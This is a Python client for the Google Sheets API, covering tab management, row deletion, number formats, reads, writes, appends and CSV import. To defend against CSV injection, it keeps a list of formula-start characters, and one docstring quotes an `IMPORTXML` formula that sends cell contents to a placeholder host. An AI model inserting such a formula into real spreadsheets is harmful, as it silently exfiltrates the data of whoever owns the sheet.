"""Google Sheets API client."""

import csv
import io
import re
from typing import Optional, List, Any

from googleapiclient.discovery import build

from oto.tools.common.credentials import require


SCOPES = ['https://www.googleapis.com/auth/spreadsheets']


#: A cell sent as a JSON number: an optional minus, digits, an optional decimal part.
#: Nothing else (no exponent, no thousands separator, no comma decimal), and no
#: leading zero on a multi-digit integer part: `06400` stays text.
_NOMBRE = re.compile(r'-?(0|[1-9]\d*)(\.\d+)?')
#: First characters a spreadsheet reads as the start of a formula (OWASP, "CSV
#: injection").
_FORMULE = ('=', '+', '-', '@', '\t', '\r')

#: A bare A1 range (`A:R`, `B5:D`, `5:9`), as opposed to a bare sheet name.
_A1 = re.compile(r'[A-Za-z]{0,3}\d*(:[A-Za-z]{0,3}\d*)?')


class SheetsClientError(Exception):
    pass


class SheetsClient:
    """Google Sheets API client."""

    def __init__(self, credentials=None):
        """`credentials`: Google credentials provided by the consumer (required)."""
        self.service = build('sheets', 'v4', credentials=require(credentials, 'GOOGLE_CREDENTIALS'))
        self.sheets = self.service.spreadsheets()

    def create(self, title: str, sheets: Optional[List[str]] = None) -> dict:
        """Create a new spreadsheet, with the tabs named in `sheets` (in order).

        Without `sheets`, Google creates one tab named in the account's locale
        (`Sheet1`, `Feuille 1`…): a write to `'Prospects'!A1` right after then fails
        with a 400 (`Unable to parse range`) because no such tab exists. Naming the
        tabs here spares the add_sheet round trip and the guess on the default name.
        """
        body: dict = {'properties': {'title': title}}
        if sheets:
            body['sheets'] = [{'properties': {'title': _tab_title(t)}} for t in sheets]
        result = self.sheets.create(
            body=body,
            fields='spreadsheetId,spreadsheetUrl,properties.title,sheets.properties',
        ).execute()
        return {
            'id': result['spreadsheetId'],
            'title': result['properties']['title'],
            'url': result['spreadsheetUrl'],
            'sheets': [s['properties']['title'] for s in result.get('sheets', [])],
        }

    # --- tabs, rows, formats: one transport, `spreadsheets.batchUpdate` -----------

    def _batch(self, spreadsheet_id: str, requests: List[dict]) -> dict:
        """The single `batchUpdate` call every structural op goes through."""
        return self.sheets.batchUpdate(
            spreadsheetId=spreadsheet_id, body={'requests': requests}).execute()

    def sheet_id(self, spreadsheet_id: str, sheet) -> int:
        """The numeric id of a tab, given its id or its title.

        A title is resolved on the live metadata; absent or duplicated, the call
        raises and NAMES the tabs: Google would otherwise answer a bare 400."""
        if isinstance(sheet, bool) or sheet is None:
            raise SheetsClientError("sheet: give a tab title or its numeric id")
        if isinstance(sheet, int):
            return sheet
        title = str(sheet).strip()
        if title.isdigit():
            return int(title)
        tabs = self.get_metadata(spreadsheet_id)['sheets']
        found = [t for t in tabs if t['title'] == title]
        if len(found) == 1:
            return found[0]['id']
        names = ', '.join(repr(t['title']) for t in tabs) or '(none)'
        if not found:
            raise SheetsClientError(f"no tab named {title!r}; tabs: {names}")
        raise SheetsClientError(f"{len(found)} tabs named {title!r}: pass the id")

    def add_sheet(self, spreadsheet_id: str, title: str, index: Optional[int] = None) -> dict:
        """Add a tab named `title`; `index` = its 0-based position (end by default)."""
        props: dict = {'title': _tab_title(title)}
        if index is not None:
            props['index'] = int(index)
        result = self._batch(spreadsheet_id, [{'addSheet': {'properties': props}}])
        added = result['replies'][0]['addSheet']['properties']
        return {'id': added['sheetId'], 'title': added['title'], 'index': added.get('index')}

    def rename_sheet(self, spreadsheet_id: str, sheet, new_title: str) -> dict:
        sid = self.sheet_id(spreadsheet_id, sheet)
        self._batch(spreadsheet_id, [{'updateSheetProperties': {
            'properties': {'sheetId': sid, 'title': _tab_title(new_title)},
            'fields': 'title'}}])
        return {'id': sid, 'title': _tab_title(new_title)}

    def delete_sheet(self, spreadsheet_id: str, sheet) -> dict:
        """Delete a tab AND everything in it. Irreversible: callers confirm first."""
        sid = self.sheet_id(spreadsheet_id, sheet)
        self._batch(spreadsheet_id, [{'deleteSheet': {'sheetId': sid}}])
        return {'id': sid, 'deleted': True}

    def delete_rows(self, spreadsheet_id: str, sheet, start_row: int, end_row: int) -> dict:
        """Delete rows `start_row`..`end_row` INCLUSIVE, 1-based as the sheet shows
        them; the rows below move up. Irreversible: callers confirm first."""
        start, end = int(start_row), int(end_row)
        if start < 1 or end < start:
            raise SheetsClientError(
                f"rows: start_row >= 1 and end_row >= start_row (got {start}..{end})")
        sid = self.sheet_id(spreadsheet_id, sheet)
        self._batch(spreadsheet_id, [{'deleteDimension': {'range': {
            'sheetId': sid, 'dimension': 'ROWS',
            'startIndex': start - 1, 'endIndex': end}}}])
        return {'id': sid, 'deleted_rows': end - start + 1, 'from_row': start, 'to_row': end}

    def number_format(self, spreadsheet_id: str, range: str, pattern: str,
                      type: str = 'NUMBER') -> dict:
        """Apply a number format to every cell of an A1 range (`'Tab'!B2:D` ; a bare
        range means the first tab). `type`: NUMBER | CURRENCY | PERCENT | DATE |
        TIME | DATE_TIME | SCIENTIFIC | TEXT ; `pattern` as in the sheet UI
        (`#,##0.00`, `0.0%`, `dd/mm/yyyy`)."""
        kind = str(type).upper()
        if kind not in _NUMBER_FORMAT_TYPES:
            raise SheetsClientError(
                f"type: one of {', '.join(_NUMBER_FORMAT_TYPES)} (got {type!r})")
        grid = self._grid_range(spreadsheet_id, range)
        self._batch(spreadsheet_id, [{'repeatCell': {
            'range': grid,
            'cell': {'userEnteredFormat': {'numberFormat': {'type': kind, 'pattern': pattern}}},
            'fields': 'userEnteredFormat.numberFormat'}}])
        return {'range': range, 'type': kind, 'pattern': pattern}

    def _grid_range(self, spreadsheet_id: str, range: str) -> dict:
        """An A1 range as a GridRange: tab resolved by title, open bounds left open."""
        sheet, cells = _split_range(range)
        title = sheet[:-1].strip("'").replace("''", "'") if sheet else None
        if title:
            sid = self.sheet_id(spreadsheet_id, title)
        else:
            tabs = self.get_metadata(spreadsheet_id)['sheets']
            if not tabs:
                raise SheetsClientError("the spreadsheet has no tab")
            sid = tabs[0]['id']
        grid: dict = {'sheetId': sid}
        if cells:
            start, _, end = cells.partition(':')
            end = end or start
            c0, r0 = _col_row(start)
            c1, r1 = _col_row(end)
            if c0 is not None:
                grid['startColumnIndex'] = c0
            if r0 is not None:
                grid['startRowIndex'] = r0 - 1
            if c1 is not None:
                grid['endColumnIndex'] = c1 + 1
            if r1 is not None:
                grid['endRowIndex'] = r1
        return grid

    def get_metadata(self, spreadsheet_id: str) -> dict:
        """Get spreadsheet metadata (title, sheets, etc.)."""
        result = self.sheets.get(
            spreadsheetId=spreadsheet_id,
            fields='spreadsheetId,properties.title,sheets.properties'
        ).execute()
        return {
            'id': result['spreadsheetId'],
            'title': result['properties']['title'],
            'sheets': [
                {
                    'id': s['properties']['sheetId'],
                    'title': s['properties']['title'],
                    'rows': s['properties'].get('gridProperties', {}).get('rowCount'),
                    'cols': s['properties'].get('gridProperties', {}).get('columnCount'),
                }
                for s in result.get('sheets', [])
            ]
        }

    def read(
        self,
        spreadsheet_id: str,
        range: str = 'A:ZZ',
        value_render: str = 'FORMATTED_VALUE',
    ) -> List[List[Any]]:
        """Read values from a range. Returns list of rows."""
        result = self.sheets.values().get(
            spreadsheetId=spreadsheet_id,
            range=range,
            valueRenderOption=value_render,
        ).execute()
        return result.get('values', [])

    def write(
        self,
        spreadsheet_id: str,
        range: str,
        values: List[List[Any]],
        value_input: str = 'USER_ENTERED',
    ) -> dict:
        """Write values to a range (overwrites existing data)."""
        result = self.sheets.values().update(
            spreadsheetId=spreadsheet_id,
            range=range,
            valueInputOption=value_input,
            body={'values': values},
        ).execute()
        return {
            'updated_range': result.get('updatedRange'),
            'updated_rows': result.get('updatedRows'),
            'updated_cols': result.get('updatedColumns'),
            'updated_cells': result.get('updatedCells'),
        }

    def append(
        self,
        spreadsheet_id: str,
        range: str,
        values: List[List[Any]],
        value_input: str = 'USER_ENTERED',
    ) -> dict:
        """Append rows after existing data, starting at the FIRST column of `range`.

        Google appends after the last "table" it detects inside the range, starting at
        that table's first column: on `Sheet!A:R`, a block of data starting at column R
        sends the new row to R…AI. The call is therefore anchored on the first column
        of the range (`Sheet!A:A`), whose only table starts in that column; the
        written range is then checked, and a row written elsewhere raises.
        """
        anchor, column = _append_anchor(range)
        result = self.sheets.values().append(
            spreadsheetId=spreadsheet_id,
            range=anchor,
            valueInputOption=value_input,
            insertDataOption='INSERT_ROWS',
            body={'values': values},
        ).execute()
        updates = result.get('updates', {})
        written = updates.get('updatedRange')
        if written and _first_column(written) != column:
            raise SheetsClientError(
                f"append landed at {written}, not in column {column} as requested "
                f"by {range!r}: the row is written there and must be moved or deleted")
        return {
            'updated_range': written,
            'updated_rows': updates.get('updatedRows'),
            'updated_cells': updates.get('updatedCells'),
        }

    def clear(self, spreadsheet_id: str, range: str) -> dict:
        """Clear values in a range."""
        result = self.sheets.values().clear(
            spreadsheetId=spreadsheet_id,
            range=range,
            body={},
        ).execute()
        return {'cleared_range': result.get('clearedRange')}

    def write_csv(
        self,
        spreadsheet_id: str,
        csv_path: str,
        sheet_name: Optional[str] = None,
    ) -> dict:
        """Write a CSV file to a sheet (clears then writes)."""
        with open(csv_path, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            values = list(reader)

        # Resolve actual sheet name if not provided
        if not sheet_name:
            meta = self.get_metadata(spreadsheet_id)
            sheet_name = meta['sheets'][0]['title'] if meta['sheets'] else 'Sheet1'

        range_name = f"'{sheet_name}'!A1"
        self.clear(spreadsheet_id, f"'{sheet_name}'")
        return self.write(spreadsheet_id, range_name, values)

    def read_csv(self, spreadsheet_id: str, range: str = 'A:ZZ') -> str:
        """Read a sheet and return as CSV string."""
        rows = self.read(spreadsheet_id, range)
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerows(rows)
        return output.getvalue()


_NUMBER_FORMAT_TYPES = ('NUMBER', 'CURRENCY', 'PERCENT', 'DATE', 'TIME',
                        'DATE_TIME', 'SCIENTIFIC', 'TEXT')


def _tab_title(title: str) -> str:
    """A tab title, checked before it goes out: Google refuses an empty one or one
    over 100 characters with a bare 400."""
    t = str(title or '').strip()
    if not t or len(t) > 100:
        raise SheetsClientError("a tab title is 1 to 100 characters")
    return t


def _col_row(cell: str) -> tuple:
    """`B5` → (1, 5) ; `B` → (1, None) ; `5` → (None, 5). 0-based column."""
    letters = ''.join(c for c in cell if c.isalpha()).upper()
    digits = ''.join(c for c in cell if c.isdigit())
    col = None
    if letters:
        col = 0
        for ch in letters:
            col = col * 26 + (ord(ch) - 64)
        col -= 1
    return col, (int(digits) if digits else None)


def values_from_csv(text: str, formulas: bool = False) -> List[List[Any]]:
    """The rows of a CSV text, typed for a `USER_ENTERED` write.

    RFC 4180: comma, double quotes, line breaks inside quoted fields; a leading
    UTF-8 BOM is dropped. Each cell:

    - a strict number (`-150.5`, `42`) goes as a JSON number — sent as text, a
      sheet in a comma-decimal locale would read `-150.5` as something else;
    - a cell starting with `'` stays text as is: the apostrophe is what keeps
      `USER_ENTERED` from reading it (a 16-digit id it would cut to 15 digits);
    - a cell `USER_ENTERED` would open as a FORMULA (`=`, `+`, `-`, `@`, tab, carriage
      return) goes prefixed with `'`, unless `formulas=True`: a connector's CSV
      carries text typed by third parties, and `=IMPORTXML("https://x/?"&A1)`
      would send the sheet's content away;
    - anything else stays text, so `USER_ENTERED` still reads dates and the like.

    Rows are returned as they come, uneven lengths included: the sheet takes them
    as written; a blank line is no row. A CSV with no rows gives `[]`.
    """
    if text.startswith('\ufeff'):
        text = text[1:]
    rows = csv.reader(io.StringIO(text, newline=''))
    return [[_cellule(c, formulas) for c in row] for row in rows if row]


def neutralize_formula(text: str) -> str:
    """A text cell prefixed with `'` if a spreadsheet would open it as a formula."""
    return "'" + text if text.startswith(_FORMULE) else text


def _cellule(cell: str, formulas: bool) -> Any:
    if _NOMBRE.fullmatch(cell):
        return float(cell) if '.' in cell else int(cell)
    return cell if formulas else neutralize_formula(cell)


def _split_range(range: str) -> tuple:
    """`'Sheet'!A1:B2` → (`'Sheet'!`, `A1:B2`) ; a bare sheet name has no cells."""
    sheet, bang, cells = range.rpartition('!')
    if bang:
        return sheet + '!', cells
    if _A1.fullmatch(range):
        return '', range
    return range + '!', ''


def _first_column(range: str) -> str:
    """First column letter(s) of an A1 range ; `A` when the range names none."""
    _, cells = _split_range(range)
    start = cells.split(':')[0]
    letters = ''.join(c for c in start if c.isalpha()).upper()
    return letters or 'A'


def _append_anchor(range: str) -> tuple:
    """The single-column range an append is sent to, and its column."""
    sheet, cells = _split_range(range)
    start = cells.split(':')[0]
    column = _first_column(range)
    row = ''.join(c for c in start if c.isdigit())
    return f"{sheet}{column}{row}:{column}", column

